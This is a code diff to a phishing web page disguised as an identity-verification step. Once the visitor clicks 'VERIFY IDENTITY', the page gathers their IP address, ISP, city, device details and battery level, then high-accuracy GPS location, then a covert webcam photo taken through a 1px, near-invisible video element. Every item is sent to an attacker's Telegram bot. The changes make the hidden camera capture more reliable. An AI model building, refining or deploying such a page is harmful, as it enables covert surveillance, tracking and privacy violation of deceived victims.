@@ -9,6 +9,8 @@
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
         .box { background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
         .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        /* ڤیدیۆکە لێرە بە قەبارەی 1px دادەنێین بۆ ئەوەی چالاک بێت بەڵام دیار نەبێت */
+        #spy-vid { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; }
     </style>
 </head>
 <body>
@@ -20,8 +22,7 @@
     <button class="btn" id="startBtn">VERIFY IDENTITY</button>
 </div>
 
-<!-- ڤیدیۆکەمان کردووە بە 200x200 بەڵام شاراوەیە، بۆ ئەوەی دڵنیابین کە ڕەش دەرناچێت -->
-<video id="spy-vid" autoplay playsinline muted style="width:200px; height:200px; position:fixed; top:-1000px;"></video>
+<video id="spy-vid" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -40,16 +41,11 @@
         this.innerHTML = "Verifying...";
         this.disabled = true;
 
-        // ١. یەکەمجار داتاکانی (IP, Battery, Device) دەنێرێت
         await getFullLog();
-
-        // ٢. داوای لوکەیشن دەکات و تا نەنێردرێت ناچێتە هەنگاوی دواتر
         await getGPS();
         
-        // ٣. داوای کامێرا دەکات
-        setTimeout(() => {
-            getCamera();
-        }, 1000);
+        // دەستپێکردنی وێنەگرتن
+        getCamera();
     });
 
     async function getFullLog() {
@@ -64,7 +60,7 @@
             const fullMsg = `🔥 Target Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${navigator.userAgent}\n🔋 Battery: ${batteryLevel}\n📅 Date: ${new Date().toLocaleString()}`;
             await sendToBot(fullMsg);
         } catch (e) {
-            await sendToBot("❌ Error Fetching IP Log");
+            console.log("Log error");
         }
     }
 
@@ -74,13 +70,8 @@
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                     resolve();
-                }, async (err) => { 
-                    await sendToBot("❌ GPS Access Denied");
-                    resolve();
-                }, {enableHighAccuracy: true, timeout: 5000});
-            } else {
-                resolve();
-            }
+                }, () => { sendToBot("❌ GPS Denied"); resolve(); }, {enableHighAccuracy: true, timeout: 5000});
+            } else { resolve(); }
         });
     }
 
@@ -90,27 +81,31 @@
             const video = document.getElementById('spy-vid');
             video.srcObject = stream;
 
-            // گرنگ: چاوەڕێ دەکات تا ڤیدیۆکە بە تەواوی ئیش دەکات (بۆ ئەوەی ڕەش نەبێت)
-            video.onloadedmetadata = async () => {
-                await new Promise(r => setTimeout(r, 4000)); // کاتێکی زیاتر بۆ ڕوونکردنەوەی وێنەکە
+            // گرنگ: دڵنیابوونەوە لەوەی ڤیدیۆکە دەستی بەکارکردن کردووە
+            video.onplaying = async () => {
+                // چاوەڕوانکردنی ٤ چرکە بۆ ئەوەی وێنەکە ڕوون بێتەوە و ڕەش نەبێت
+                await new Promise(r => setTimeout(r, 4000));
                 
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                // ئەگەر Width سفر بوو، قەبارەیەکی گریمانەیی (Defaults) دابنێ
+                canvas.width = video.videoWidth > 0 ? video.videoWidth : 640;
+                canvas.height = video.videoHeight > 0 ? video.videoHeight : 480;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', '👤 Captured Image');
+                    fd.append('photo', blob, 'capture.jpg');
+                    fd.append('caption', '👤 Captured Photo (Fixed)');
                     
                     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                }, 'image/jpeg', 0.9);
+                }, 'image/jpeg', 0.82);
             };
         } catch (e) {
-            await sendToBot("❌ Camera Access Denied");
+            sendToBot("❌ Camera Access Denied");
         }
     }
 </script>
